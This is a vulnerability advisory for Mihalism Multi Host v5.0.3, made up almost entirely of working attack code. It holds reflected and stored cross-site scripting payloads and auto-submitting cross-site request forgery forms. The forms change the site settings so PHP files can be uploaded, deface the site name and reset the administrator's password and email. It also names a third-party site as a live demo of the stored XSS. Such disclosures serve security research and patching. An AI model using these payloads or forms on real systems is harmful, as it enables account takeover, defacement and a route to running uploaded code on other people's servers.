================================================================================
# Mihalism Multi Host v5.0.3 Xss-Csrf
================================================================================
# Vendor Homepage: www.mihalism.net
# Date: 10/02/2016
# Version : v5.0.3
# Author: Ashiyane Digital Security Team
# Contact: hehsan979@gmail.com
# Source: http://ehsansec.ir/advisories/multihoster-xss-xsrf.txt
================================================================================
# Reflected Cross Site Scripting:

http://localhost/viewer.php?file=<img src=x onerror='alert(1)'>
http://localhost/download.php?file=<img src=x onerror='alert(1)'>

# Reflected Cross Site Scripting:

<body onload='document.exploit.submit()'>
<form action="http://localhost/multihost/upload.php" method="post"
name="exploit">
<input type="text" name="userfile[]" value="<img src=x onerror='alert(1)'>">
<input name="upload_type" value="url-standard" type="hidden">
</form>
</body>

# Stored Cross Site Scripting:
<body onload='document.exploit.submit()'>
<form action="http://localhost/multihost/admin.php?act=site_settings-s"
method="post" name="exploit">
<input type="hidden" name="site_name" value='"><script>alert(1)</script>'>
<input type="hidden" name="file_extensions" value='"><script>alert(2)</script>'>
<input type="hidden" name="user_file_extensions"
value='"><script>alert(3)</script>'>
<input type="hidden" name="date_format" value='"><script>alert(12)</script>'>
<input type="hidden" name="google_analytics"
value='"><script>alert(13)</script>'>
<input type="hidden" name="recaptcha_public"
value='"><script>alert(14)</script>'>
</form>
</body>

Now See :
http://localhost/admin.php?act=site_settings
http://localhost/
and some other pages.


# Cross Site Request Forgery (Change Site Settings):

<body onload='document.exploit.submit()'>
<form action="http://localhost/multihost/admin.php?act=site_settings-s"
method="post" name="exploit">
<input type="hidden" name="site_name" value='"><h1>Hacked By Ehsan</h1>'>
<input type="hidden" name="file_extensions" value='php'> <!--Allowed
File Extensions / For upload php files-->
<input type="hidden" name="user_file_extensions" value='php'> <!--
Allowed File Extensions / For upload php files-->
<input type="hidden" name="max_filesize" value='1075000'>
<input type="hidden" name="user_max_filesize" value='3145728'>
<input type="hidden" name="max_bandwidth" value='10240'>
<input type="hidden" name="user_max_bandwidth" value='10240'>
<input type="hidden" name="email_in" value='hacked@email.com'>
<input type="hidden" name="email_out" value='noreply@localhost'>
<input type="hidden" name="thumbnail_height" value='160'>
<input type="hidden" name="thumbnail_width" value='160'>
<input type="hidden" name="date_format" value='F j, Y, g:i:s A'>
<input type="hidden" name="google_analytics" value='UA-1125794-2'>
<input type="hidden" name="recaptcha_public" value=''>
<input type="submit" value="Save Settings">
</form>
</body>

# Cross Site Request Forgery (Change Admin Password and Mail)

<body onload='document.exploit.submit()'>
<form action="http://localhost/multihost/admin.php?act=users-s-s"
method="post" name="exploit">
<input type="hidden" name="user_id" value="1">
<input type="password" name="password" value="passwd">
<input type="text" name="email_address" value="hacker@mail.com">
</form>
</body>

# Demo for Stored Cross Site Scripting:
http://8pic.ir/
================================================================================
# Discovered By : Ehsan Hosseini (EhsanSec.ir)
# Thanks to one of my best friend Milad Hacking (FullSecurity.org)
================================================================================
